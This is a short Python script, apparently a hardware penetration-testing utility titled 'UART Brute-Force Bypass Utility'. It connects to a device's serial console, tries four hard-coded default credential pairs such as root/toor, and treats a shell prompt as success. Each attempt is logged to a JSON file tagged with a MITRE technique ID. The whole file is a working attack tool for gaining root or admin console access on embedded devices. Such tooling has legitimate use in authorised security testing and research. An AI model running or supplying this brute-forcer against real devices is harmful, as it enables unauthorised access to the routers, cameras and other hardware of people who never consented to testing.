#!/usr/bin/env python3

import serial, time, argparse, os, json
from datetime import datetime

LOG_FILE = "results/uart_bruteforce_log.json"
MITRE_TTP = "T1552.001"
DEFAULT_CREDS = [("root", "root"), ("admin", "admin"), ("admin", "1234"), ("root", "toor")]

def log_bf(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def bruteforce_uart(port="/dev/ttyUSB0", baud=115200):
    try:
        ser = serial.Serial(port, baudrate=baud, timeout=2)
        for user, pw in DEFAULT_CREDS:
            ser.write(f"{user}\n".encode())
            time.sleep(1)
            ser.write(f"{pw}\n".encode())
            time.sleep(2)
            output = ser.read(1024).decode(errors="ignore")
            if "$" in output or "#" in output:
                log_bf({
                    "timestamp": datetime.utcnow().isoformat(),
                    "port": port,
                    "baud": baud,
                    "user": user,
                    "pass": pw,
                    "success": True,
                    "ttp": MITRE_TTP
                })
                return True
        return False
    except Exception as e:
        print(f"[!] UART BF failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="UART Brute-Force Bypass Utility")
    parser.add_argument("--port", default="/dev/ttyUSB0", help="UART port")
    parser.add_argument("--baud", type=int, default=115200, help="Baud rate")
    args = parser.parse_args()

    result = bruteforce_uart(args.port, args.baud)
    if not result:
        log_bf({
            "timestamp": datetime.utcnow().isoformat(),
            "port": args.port,
            "baud": args.baud,
            "success": False,
            "ttp": MITRE_TTP
        })

if __name__ == "__main__":
    main()
